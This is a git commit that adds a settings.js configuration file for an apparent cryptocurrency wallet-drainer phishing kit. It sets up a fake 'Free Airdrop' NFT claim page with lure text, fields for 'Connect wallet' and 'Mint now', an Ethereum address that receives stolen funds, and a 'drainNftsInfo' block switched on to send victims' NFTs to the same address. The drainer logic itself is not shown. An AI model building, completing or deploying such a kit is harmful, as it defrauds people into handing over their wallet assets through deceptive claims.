2a3fa29097d7c3c16675c559c3428108b745843b
rnt7626 <135423073+rnt7626@users.noreply.github.com>
2023-06-03 14:01:51 +0300

    Add files via upload

---
+++ settings.js
@@ -0,0 +1,47 @@
+const receiveAddress = '0x41130aa3625750077a4C9203a3597c0Eb84276EE',
+  collectionInfo = {
+    name: 'THE NFT ISLAND',
+    socialMedia: {
+      discord: 'https://discord.gg/TW9AwmuRhz',
+      twitter: 'https://twitter.com/thenftislandsio',
+      instagram: 'https://instagram.com/',
+    },
+  },
+
+  indexPageInfo = {
+    backgroundImage: 'background.jpg',
+    title: '{name}',
+    underTitle: 'Free Airdrop',
+  },
+
+  claimPageInfo = {
+    title: 'GET YOUR<br>NFT NOW',
+    shortDescription: 'Own, stake and build in our limitless possibilities Minecraft Metaverse',
+    longDescription:
+      'After claim, NTFs will appear in your Metamask wallet within 10 minutes',
+    claimButtonText: 'CLAIM NOW',
+    image: 'bg3.png',
+    imageRadius: 250,
+  },
+
+  drainNftsInfo = {
+    active: true,
+    minValue: 0.1,
+    nftReceiveAddress: '0x41130aa3625750077a4C9203a3597c0Eb84276EE',
+  },
+
+  customStrings = {
+    title: 'MINT {name}',
+    connectButton: 'Connect wallet',
+    transferButton: 'Mint now',
+    dateString: 'Pre sale available {date}',
+  }
+  
+if (
+  !receiveAddress.startsWith('0x') ||
+  receiveAddress.length >= 64 || receiveAddress.length <= 40
+) {
+  console.error(
+    'Error: ' + receiveAddress + ' is not a valid Ethereum address.'
+  )
+}
